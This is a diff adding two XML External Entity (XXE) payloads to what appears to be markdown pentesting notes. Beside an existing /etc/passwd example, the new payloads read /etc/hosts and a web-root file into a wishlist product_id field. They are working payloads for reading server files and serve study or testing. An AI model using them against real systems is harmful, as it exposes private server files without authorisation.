@@ -31,6 +31,29 @@
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>   
 <root>&read;</root>
 ```
+
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+</wishlist>
+```
+
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
+<wishlist>
+	<user_id>1</user_id>
+	<item>
+	       <product_id>&payload;</product_id>
+	</item>
+</wishlist>
+```
+
 ##### in-band XXE attack
 ##### out-of-band XXE attacks (blind XXE)
 ### Broken Access Control
